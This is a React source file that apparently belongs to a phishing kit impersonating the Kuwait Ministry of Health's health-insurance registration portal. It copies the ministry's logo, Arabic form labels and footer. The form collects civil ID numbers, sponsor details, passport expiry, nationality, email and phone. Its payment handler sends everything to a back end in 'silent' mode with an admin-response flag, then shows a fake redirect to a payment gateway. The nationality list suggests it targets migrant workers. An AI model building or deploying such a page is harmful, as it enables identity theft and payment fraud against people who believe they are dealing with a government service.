import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData } from '../lib/store';

export default function MOHRegister() {
  const [, setLocation] = useLocation();

  // Top section
  const [serviceType, setServiceType] = useState('');
  const [residenceType, setResidenceType] = useState('');
  const [yearlyAmount, setYearlyAmount] = useState('');

  // Personal info
  const [insuranceStatus, setInsuranceStatus] = useState('');
  const [civilId, setCivilId] = useState('');
  const [sponsorCivilId, setSponsorCivilId] = useState('');
  const [sponsorName, setSponsorName] = useState('');
  const [fullName, setFullName] = useState('');
  const [gender, setGender] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [nationality, setNationality] = useState('');
  const [company, setCompany] = useState('');
  const [workplace, setWorkplace] = useState('');
  const [passportExpiry, setPassportExpiry] = useState('');
  const [yearsCount, setYearsCount] = useState('');
  const [coverageStart, setCoverageStart] = useState('');
  const [coverageEnd, setCoverageEnd] = useState('');

  // Contact
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');

  // Payment
  const [paymentMethod, setPaymentMethod] = useState('بوابة الدفع الإلكتروني');
  const [totalAmount, setTotalAmount] = useState(0);
  const [agreeTerms, setAgreeTerms] = useState(false);

  // Username from previous page
  const [userName, setUserName] = useState('');

  // Payment summary
  const [showPaymentSummary, setShowPaymentSummary] = useState(false);

  useEffect(() => {
    navigateToPage('صفحة التسجيل');
    const storedName = localStorage.getItem('mohUserName') || '';
    const storedCivilId = localStorage.getItem('mohCivilId') || '';
    setUserName(storedName);
    setCivilId(storedCivilId);
  }, []);

  useEffect(() => {
    if (yearlyAmount && yearsCount) {
      setTotalAmount(parseInt(yearlyAmount) * parseInt(yearsCount));
    }
  }, [yearlyAmount, yearsCount]);

  useEffect(() => {
    if (coverageStart && yearsCount) {
      const start = new Date(coverageStart);
      start.setFullYear(start.getFullYear() + parseInt(yearsCount));
      setCoverageEnd(start.toISOString().split('T')[0]);
    }
  }, [coverageStart, yearsCount]);

  useEffect(() => {
    if (residenceType) {
      setYearlyAmount('100');
    }
  }, [residenceType]);

  const isFormComplete = serviceType && residenceType && civilId && yearsCount && coverageStart && passportExpiry && email && phone && agreeTerms;

  const handlePayment = () => {
    if (!isFormComplete) return;

    const allData = {
      'نوع الخدمة': serviceType,
      'نوع الإقامة': residenceType,
      'المبلغ في السنة': yearlyAmount,
      'حالة الضمان الصحي': insuranceStatus,
      'الرقم المدني': civilId,
      'الرقم المدني للكفيل': sponsorCivilId,
      'اسم الكفيل': sponsorName,
      'الاسم': fullName,
      'الجنس': gender,
      'تاريخ الميلاد': birthDate,
      'الجنسية': nationality,
      'الشركة': company,
      'مكان العمل': workplace,
      'تاريخ إنتهاء صلاحية الجواز': passportExpiry,
      'عدد السنوات': yearsCount,
      'تاريخ بداية التغطية': coverageStart,
      'تاريخ نهاية التغطية': coverageEnd,
      'البريد الإلكتروني': email,
      'رقم الهاتف': phone,
      'طريقة الدفع': paymentMethod,
      'إجمالي المبلغ': totalAmount,
    };

    sendData({
      data: allData,
      current: 'الدفع الإلكتروني',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    setShowPaymentSummary(true);
    navigateToPage('ملخص الدفع');
  };

  const handleClear = () => {
    setServiceType(''); setResidenceType(''); setYearlyAmount('');
    setInsuranceStatus(''); setSponsorCivilId(''); setSponsorName('');
    setFullName(''); setGender(''); setBirthDate('');
    setNationality(''); setCompany(''); setWorkplace('');
    setPassportExpiry(''); setYearsCount(''); setCoverageStart('');
    setCoverageEnd(''); setEmail(''); setPhone('');
    setTotalAmount(0); setAgreeTerms(false);
  };

  const serviceTypes = ['ضمان فردي', 'ضمان جماعي', 'تجديد ضمان فردي', 'تجديد ضمان جماعي'];
  const residenceTypes = [
    'Work Visa Private - 18', 'Husband - 22', 'Wife - 23', 'Son - 24',
    'Daughter - 25', 'Father - 26', 'Mother - 27', 'Government - 17',
    'Domestic Worker - 20',
  ];
  const insuranceStatuses = ['--اختار--', 'جديد', 'منتهي', 'ساري'];
  const genders = ['--اختار--', 'ذكر', 'أنثى'];
  const nationalities = ['--اختار--', 'هندي', 'بنغلاديشي', 'سريلانكي', 'فلبيني', 'مصري', 'باكستاني', 'نيبالي', 'إثيوبي', 'أخرى'];
  const yearOptions = ['1', '2', '3', '4', '5'];

  // Shared styles
  const css = `
    .moh-field { display: flex; align-items: center; margin-bottom: 12px; }
    .moh-field label { min-width: 160px; text-align: right; font-size: 13px; font-weight: bold; color: #333; padding-left: 10px; white-space: nowrap; }
    .moh-field input, .moh-field select { flex: 1; padding: 8px 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; font-family: Cairo, Tahoma, Arial, sans-serif; outline: none; direction: rtl; background: #fff; max-width: 220px; }
    .moh-field input[readonly] { background: #e9ecef; color: #555; }
    .moh-field .req { color: red; }
    .moh-row { display: flex; flex-wrap: wrap; gap: 10px; justify-content: flex-end; }
    .moh-row .moh-field { flex: 1; min-width: 280px; justify-content: flex-end; }
    @media (max-width: 768px) {
      .moh-row { flex-direction: column; }
      .moh-row .moh-field { min-width: 100%; }
      .moh-field label { min-width: 120px; font-size: 12px; }
      .moh-field input, .moh-field select { max-width: 100%; }
    }
  `;

  // Payment Summary Page
  if (showPaymentSummary) {
    return (
      <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff' }}>
        <div style={{ background: '#1a3a5c', padding: '20px 0', textAlign: 'center' }}>
          <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" style={{ width: 120, height: 120, margin: '0 auto', borderRadius: '50%', background: '#fff', padding: 5 }} />
          <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
        </div>

        <div style={{ maxWidth: 600, margin: '40px auto', padding: '0 20px' }}>
          <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
            <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
              <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>ملخص الدفع</span>
            </div>
            <div style={{ padding: '30px 25px', background: '#f9f9f9' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <tbody>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>نوع الخدمة</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{serviceType}</td>
                  </tr>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>نوع الإقامة</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{residenceType}</td>
                  </tr>
                  <tr style={{ borderBottom: '1px solid #eee' }}>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>عدد السنوات</td>
                    <td style={{ padding: '12px 10px', color: '#333' }}>{yearsCount}</td>
                  </tr>
                  <tr>
                    <td style={{ padding: '12px 10px', fontWeight: 'bold', color: '#555' }}>إجمالي المبلغ</td>
                    <td style={{ padding: '12px 10px', color: '#d32f2f', fontWeight: 'bold', fontSize: 18 }}>{totalAmount} د.ك</td>
                  </tr>
                </tbody>
              </table>

              <div style={{ textAlign: 'center', marginTop: 30 }}>
                <div style={{
                  width: 50, height: 50, border: '4px solid #eee', borderTop: '4px solid #1076BB',
                  borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 15px',
                }} />
                <p style={{ color: '#555', fontSize: 15 }}>جاري تحويلك لبوابة الدفع الإلكتروني...</p>
                <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
              </div>
            </div>
          </div>
        </div>

        <div style={{ textAlign: 'center', padding: '20px 0', marginTop: 40, borderTop: '1px solid #eee' }}>
          <p style={{ color: '#888', fontSize: 13, margin: 0 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#f0f2f5' }}>
      <style>{css}</style>

      {/* Header */}
      <div style={{ background: '#1a3a5c', padding: '20px 0', textAlign: 'center' }}>
        <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" style={{ width: 120, height: 120, margin: '0 auto', borderRadius: '50%', background: '#fff', padding: 5 }} />
        <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
      </div>

      {/* User info bar */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 30px', background: '#fff', borderBottom: '1px solid #eee' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <div style={{ width: 40, height: 40, background: '#ddd', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="#888"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </div>
          <span style={{ color: '#d32f2f', fontSize: 14, fontWeight: 'bold' }}>{userName || 'المستخدم'}</span>
        </div>
        <span style={{ color: 'red', fontSize: 14, cursor: 'pointer' }}>English</span>
      </div>

      <div style={{ maxWidth: 1100, margin: '20px auto', padding: '0 15px' }}>
        {/* Service Type Section */}
        <div style={{ background: '#e8edf2', padding: '15px 20px', borderRadius: 4, marginBottom: 15 }}>
          <div className="moh-row">
            <div className="moh-field">
              <select value={serviceType} onChange={(e) => setServiceType(e.target.value)} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 180 }}>
                <option value="">--اختار--</option>
                {serviceTypes.map(t => <option key={t} value={t}>{t}</option>)}
              </select>
              <label>نوع الخدمة</label>
            </div>
            <div className="moh-field">
              <select value={residenceType} onChange={(e) => setResidenceType(e.target.value)} style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, fontFamily: 'Cairo, Tahoma, Arial, sans-serif', maxWidth: 220 }}>
                <option value="">--اختار--</option>
                {residenceTypes.map(t => <option key={t} value={t}>{t}</option>)}
              </select>
              <label>نوع الاقامه</label>
            </div>
            <div className="moh-field">
              <input type="text" value={yearlyAmount} readOnly style={{ flex: 1, padding: '8px 10px', border: '1px solid #ccc', borderRadius: 3, fontSize: 14, background: '#e9ecef', maxWidth: 80, textAlign: 'center' }} />
              <label>المبلغ في السنه</label>
            </div>
          </div>
        </div>

        {/* Personal Info Section */}
        <div style={{ background: '#fff', padding: '20px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          {/* Row 1 */}
          <div className="moh-row">
            <div className="moh-field">
              <select value={insuranceStatus} onChange={(e) => setInsuranceStatus(e.target.value)}>
                {insuranceStatuses.map(s => <option key={s} value={s}>{s}</option>)}
              </select>
              <label>حالة الضمان الصحي <span className="req">*</span></label>
            </div>
            <div className="moh-field" style={{ flex: 0 }}><div style={{ width: 220 }}></div><label></label></div>
            <div className="moh-field">
              <input type="text" value={civilId} onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))} />
              <label>الرقم المدني <span className="req">*</span></label>
            </div>
          </div>

          {/* Row 2: Sponsor */}
          <div className="moh-row">
            <div className="moh-field">
              <input type="text" value={sponsorCivilId} onChange={(e) => setSponsorCivilId(e.target.value.replace(/\D/g, ''))} />
              <label>الرقم المدني للكفيل</label>
            </div>
            <div className="moh-field">
              <input type="text" value={sponsorName} onChange={(e) => setSponsorName(e.target.value)} />
              <label>اسم الكفيل</label>
            </div>
          </div>

          {/* Row 3: Name */}
          <div className="moh-row">
            <div className="moh-field" style={{ flex: 0 }}><div style={{ width: 220 }}></div><label></label></div>
            <div className="moh-field" style={{ flex: 0 }}><div style={{ width: 220 }}></div><label></label></div>
            <div className="moh-field">
              <input type="text" value={fullName} readOnly />
              <label>الاسم</label>
            </div>
          </div>

          {/* Row 4: Gender + Birth */}
          <div className="moh-row">
            <div className="moh-field">
              <select value={gender} onChange={(e) => setGender(e.target.value)}>
                {genders.map(g => <option key={g} value={g}>{g}</option>)}
              </select>
              <label>الجنس</label>
            </div>
            <div className="moh-field">
              <input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} />
              <label>تاريخ الميلاد</label>
            </div>
          </div>

          {/* Row 5: Nationality */}
          <div className="moh-row">
            <div className="moh-field" style={{ flex: 0 }}><div style={{ width: 220 }}></div><label></label></div>
            <div className="moh-field" style={{ flex: 0 }}><div style={{ width: 220 }}></div><label></label></div>
            <div className="moh-field">
              <select value={nationality} onChange={(e) => setNationality(e.target.value)}>
                {nationalities.map(n => <option key={n} value={n}>{n}</option>)}
              </select>
              <label>الجنسية</label>
            </div>
          </div>

          {/* Row 6: Passport + Workplace + Company */}
          <div className="moh-row">
            <div className="moh-field">
              <input type="text" value={company} onChange={(e) => setCompany(e.target.value)} />
              <label>الشركة</label>
            </div>
            <div className="moh-field">
              <input type="text" value={workplace} onChange={(e) => setWorkplace(e.target.value)} />
              <label>مكان العمل</label>
            </div>
            <div className="moh-field">
              <input type="date" value={passportExpiry} onChange={(e) => setPassportExpiry(e.target.value)} />
              <label>تاريخ إنتهاء صلاحية الجواز <span className="req">*</span></label>
            </div>
          </div>

          {/* Row 7: Years + Coverage */}
          <div className="moh-row">
            <div className="moh-field">
              <select value={yearsCount} onChange={(e) => setYearsCount(e.target.value)}>
                <option value="">اختر عدد السنوات</option>
                {yearOptions.map(y => <option key={y} value={y}>{y}</option>)}
              </select>
              <label>عدد السنوات <span className="req">*</span></label>
            </div>
            <div className="moh-field">
              <input type="date" value={coverageStart} onChange={(e) => setCoverageStart(e.target.value)} />
              <label>تاريخ بداية التغطية <span className="req">*</span></label>
            </div>
            <div className="moh-field">
              <input type="text" value={coverageEnd} readOnly />
              <label>تاريخ نهاية التغطية</label>
            </div>
          </div>
        </div>

        {/* Contact Section */}
        <div style={{ background: '#fff', padding: '20px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div className="moh-row">
            <div className="moh-field">
              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} style={{ direction: 'ltr', textAlign: 'left' }} />
              <label>البريد الإلكتروني</label>
            </div>
            <div className="moh-field">
              <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))} maxLength={12} style={{ direction: 'ltr', textAlign: 'left' }} />
              <label>رقم الهاتف</label>
            </div>
          </div>

          {!isFormComplete && (
            <p style={{ color: 'red', fontSize: 13, textAlign: 'center', marginTop: 15 }}>
              * الرجاء ادخال البيانات المطلوبه الرقم المدني , تاريخ إنتهاء صلاحية الجواز , عدد السنوات , تاريخ بداية التغطية
            </p>
          )}
        </div>

        {/* Payment Section */}
        <div style={{ background: '#fff', padding: '15px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 15 }}>
          <div className="moh-row" style={{ alignItems: 'center' }}>
            <div className="moh-field">
              <select value={paymentMethod} onChange={(e) => setPaymentMethod(e.target.value)}>
                <option value="بوابة الدفع الإلكتروني">بوابة الدفع الإلكتروني</option>
              </select>
              <label>طريقة الدفع</label>
            </div>
            <div className="moh-field">
              <input type="text" value={totalAmount || 0} readOnly style={{ textAlign: 'center', maxWidth: 100 }} />
              <label>إجمالي المبلغ</label>
            </div>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <button
                onClick={handlePayment}
                disabled={!isFormComplete}
                style={{
                  background: isFormComplete ? '#1076BB' : '#ccc',
                  color: '#fff', border: 'none', padding: '10px 30px',
                  fontSize: 14, fontWeight: 'bold', borderRadius: 4,
                  cursor: isFormComplete ? 'pointer' : 'not-allowed',
                  fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                  whiteSpace: 'nowrap',
                }}
              >
                الدفع الإلكتروني
              </button>
            </div>
          </div>
        </div>

        {/* Terms & Clear */}
        <div style={{ background: '#fff', padding: '15px 25px', borderRadius: 4, border: '1px solid #d0dbe8', marginBottom: 30 }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 15 }}>
            <button
              onClick={handleClear}
              style={{
                background: '#d32f2f', color: '#fff', border: 'none', padding: '10px 50px',
                fontSize: 15, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              مسح
            </button>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <label style={{ fontSize: 14, color: '#333' }}>
                <span style={{ color: 'red' }}>*</span> أوافق{' '}
                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: '#1076BB', textDecoration: 'underline' }}>الشروط والأحكام</a>
              </label>
              <input
                type="checkbox"
                checked={agreeTerms}
                onChange={(e) => setAgreeTerms(e.target.checked)}
                style={{ width: 18, height: 18 }}
              />
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '20px 0', background: '#fff', borderTop: '1px solid #eee' }}>
        <p style={{ color: '#888', fontSize: 13, margin: 0 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
      </div>
    </div>
  );
}
